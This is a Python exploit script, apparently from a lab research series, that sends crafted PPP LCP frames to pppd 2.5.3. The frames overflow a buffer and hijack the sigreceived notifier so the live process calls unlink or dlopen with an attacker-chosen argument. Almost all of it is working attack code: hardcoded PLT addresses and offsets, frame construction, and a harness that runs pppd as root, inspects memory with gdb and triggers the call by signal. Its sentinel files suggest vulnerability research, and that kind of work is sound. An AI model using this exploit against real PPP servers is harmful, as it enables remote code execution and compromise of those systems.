#!/usr/bin/env python3
"""W132: one controlled call with a chosen argument from one wire frame.

W131 proved the sigreceived hijack reaches notify() but failed because its
callback (device_script) forks a child that dereferences the overflow-corrupted
the_channel before execve.  This experiment keeps the same pointer write but
uses a one-argument PLT function as the fake notifier callback.  notify() calls
(*np->func)(np->arg, val) (main.c:2155-2163), so a one-arg libc function sees
the attacker-chosen `arg` in rdi and ignores the signal number in rsi.

Default callback is unlink@plt (0x40c4a0 in the pinned -no-pie 2.5.3 build).
The attacker-chosen path names a lab sentinel file created before the frame;
the observed side effect is its removal by the live pppd process.

W133 adds a dlopen@plt callback (0x40cd70): with `--signal INT` the signal
number 2 becomes RTLD_NOW, so a pre-staged payload .so's constructor can run
a lab-chosen command. `--expect created` checks for a new sentinel instead of
a deletion. Defaults preserve the W132 behavior byte-for-byte.

Grade of the default path: control exercised in a live process (rung 4), not
a shell command, so NOT rung 5. The dlopen path is evaluated separately.
"""
import argparse
import json
import os
import struct
import subprocess
import time
from pathlib import Path

from chosen_write import set_raw, drain, find_pid
from rce_sigrecv import (hdlc, rej_frame, be_for_le_pointer, build_nak_frame,
                         REQCI_INP, NAK_BUFFER, SIGRECEIVED_OFF, FORCE_BIT)

ROOT = Path(__file__).resolve().parent
LOGDIR = ROOT / "raw"
LOGDIR.mkdir(exist_ok=True)
SECRETS = Path("/run/pppd2shell-live/chap-secrets")

UNLINK_PLT = 0x40C4A0
DLOPEN_PLT = 0x40CD70
NOTIFIER_OFF = 4
PATH_OFF = 28
CMD_WIRE_OFF = 96
DUMMY_CHANNEL_OFF = 128


def build_call_frames(callback: int, path: bytes, cmd: bytes = b""):
    """Return (nak_frame, rej_frame, layout) for one sigreceived hijack."""
    notifier_ptr = REQCI_INP + NOTIFIER_OFF
    path_ptr = REQCI_INP + PATH_OFF
    channel_ptr = REQCI_INP + DUMMY_CHANNEL_OFF

    body = bytearray(b"\x00\x00\x41\x41")
    body += struct.pack("<Q", 0)             # notifier.next = NULL
    body += struct.pack("<Q", callback)      # notifier.func
    body += struct.pack("<Q", path_ptr)      # notifier.arg
    body += b"\x00" * (PATH_OFF - len(body))
    body += path + b"\x00"
    if cmd:
        assert len(body) < CMD_WIRE_OFF, "path overruns the wire command slot"
        body += b"\x00" * (CMD_WIRE_OFF - len(body))
        body += cmd + b"\x00"
    body += b"\x00" * (256 - len(body))
    rej = rej_frame(bytes(body))

    naka, layout, pointers = build_nak_frame(channel_ptr, notifier_ptr)
    layout.update({"callback": f"0x{callback:x}",
                   "notifier_ptr": f"0x{notifier_ptr:x}",
                   "path_ptr": f"0x{path_ptr:x}",
                   "cmd_ptr": f"0x{REQCI_INP + CMD_WIRE_OFF:x}" if cmd else "",
                   "sigreceived_offset": SIGRECEIVED_OFF,
                   "force_bit": FORCE_BIT,
                   "path": path.decode(errors="replace"),
                   "wire_cmd": cmd.decode(errors="replace")})
    return naka, rej, layout, pointers


def build_safe_nak():
    """Short ConfReq: three PAP AUTHTYPE CIs, no amplification, no write."""
    pap = bytes((3, 4, 0xC0, 0x23))
    body = pap * 3
    return hdlc(struct.pack("!BBH", 1, 1, 4 + len(body)) + body)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--marker", required=True)
    ap.add_argument("--mode", choices=("attack", "safe"), default="attack")
    ap.add_argument("--callback", default=f"0x{UNLINK_PLT:x}")
    ap.add_argument("--signal", choices=("TERM", "INT", "HUP"), default="TERM")
    ap.add_argument("--expect", choices=("removed", "created"), default="removed")
    ap.add_argument("--arg-path", default=None,
                    help="callback argument (defaults to the sentinel path)")
    ap.add_argument("--wire-cmd", default=None,
                    help="benign command carried in the rejected frame body")
    ap.add_argument("--trace-exec", action="store_true",
                    help="include openat/mmap in the strace filter")
    ap.add_argument("--strace", action="store_true",
                    help="trace unlink/execve from the target process")
    a = ap.parse_args()
    callback = int(a.callback, 0)

    victim = Path("/tmp") / f"pppd2shell-r5-{a.marker}-victim"
    if a.expect == "removed":
        victim.write_text("sentinel-before\n")
    else:
        victim.unlink(missing_ok=True)
    path = str(Path(a.arg_path) if a.arg_path else victim).encode()

    if a.mode == "attack":
        naka, rej, layout, pointers = build_call_frames(
            callback, path, a.wire_cmd.encode() if a.wire_cmd else b"")
    else:
        naka, rej, layout, pointers = build_safe_nak(), None, {"mode": "safe"}, {}
    (LOGDIR / f"{a.marker}-nak.bin").write_bytes(naka)
    if rej is not None:
        (LOGDIR / f"{a.marker}-rej.bin").write_bytes(rej)

    secrets_local = LOGDIR / "chap-secrets"
    secrets_local.write_text('"labserver"\t*\t"labsecret"\t*\n'
                             '"labpeer"\t*\t"labsecret"\t*\n')
    subprocess.run(["sudo", "-n", "mkdir", "-p", str(SECRETS.parent)], check=True)
    subprocess.run(["sudo", "-n", "install", "-o", "root", "-g", "root",
                    "-m", "0600", str(secrets_local), str(SECRETS)], check=True)

    master, slave = os.openpty()
    set_raw(slave)
    slave_name = os.ttyname(slave)
    log_path = LOGDIR / f"{a.marker}-pppd.log"
    pppd_args = [
        a.binary, "nodetach", "passive", "local", "refuse-pap", "refuse-eap",
        "noip", "noipv6", "noproxyarp", "nolock", "debug",
        "escape", "09", "chap-secrets", str(SECRETS), "name", "labserver",
        slave_name,
    ]
    if a.strace:
        trace = ("trace=unlink,unlinkat,execve,openat,mmap,munmap,kill"
                 if a.trace_exec else "trace=unlink,unlinkat,execve,kill")
        argv = ["sudo", "-n", "strace", "-f",
                "-o", str(LOGDIR / f"{a.marker}-strace.log"),
                "-e", trace,
                *pppd_args]
    else:
        argv = ["sudo", "-n", "env", "ASAN_OPTIONS=detect_leaks=0", *pppd_args]
    with open(log_path, "wb") as log:
        proc = subprocess.Popen(argv, stdin=subprocess.DEVNULL, stdout=log,
                                stderr=subprocess.STDOUT, close_fds=True)
    os.close(slave)
    os.set_blocking(master, False)
    early = drain(master, proc, 2.0)
    os.write(master, naka)
    after_nak = drain(master, proc, 1.0)
    if rej is not None:
        os.write(master, rej)
        after_rej = drain(master, proc, 1.0)
    else:
        after_rej = b""

    live_pid = find_pid(a.binary, slave_name)
    gdb_txt = ""
    if live_pid is not None and a.mode == "attack":
        gargs = ["sudo", "-n", "gdb", "-q", "-batch", "-p", str(live_pid)]
        for c in ("set pagination off",
                  f"x/2gx {NAK_BUFFER + SIGRECEIVED_OFF:#x}",
                  f"x/3gx {REQCI_INP + NOTIFIER_OFF:#x}",
                  f"x/s {REQCI_INP + PATH_OFF:#x}", "detach"):
            gargs += ["-ex", c]
        try:
            gdb_txt = subprocess.run(gargs, capture_output=True, text=True,
                                     timeout=30).stdout
        except (subprocess.TimeoutExpired, OSError) as exc:
            gdb_txt = f"gdb failed: {exc}\n"
        (LOGDIR / f"{a.marker}-pre-signal-gdb.txt").write_text(gdb_txt)

    target_pid = find_pid(a.binary, slave_name) or proc.pid
    subprocess.run(["sudo", "-n", "kill", f"-{a.signal}", str(target_pid)],
                   check=False)
    after_term = drain(master, proc, 3.0)
    time.sleep(1.0)
    side_effect = (victim.exists() if a.expect == "created"
                   else not victim.exists())
    content = victim.read_text(errors="replace") if victim.exists() else ""

    rc = proc.poll()
    if rc is None:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait(timeout=3)
    os.close(master)

    for name, blob in (("early", early), ("after-nak", after_nak),
                       ("after-rej", after_rej), ("after-term", after_term)):
        (LOGDIR / f"{a.marker}-{name}.bin").write_bytes(bytes(blob))
    summary = {
        "marker": a.marker, "mode": a.mode, "binary": a.binary,
        "callback": f"0x{callback:x}", "signal": a.signal, "expect": a.expect,
        "victim": str(victim),
        "side_effect_observed": side_effect,
        "victim_content_after": content,
        "process_rc": rc, "layout": layout,
        "pointers": {k: f"0x{v:x}" for k, v in pointers.items()},
        "after_term_preview": repr(bytes(after_term)[:200]),
        "gdb_preview": gdb_txt[:1500],
    }
    (LOGDIR / f"{a.marker}-summary.json").write_text(json.dumps(summary, indent=2))
    print(json.dumps(summary, indent=2))
    return 0 if side_effect else 1


if __name__ == "__main__":
    raise SystemExit(main())
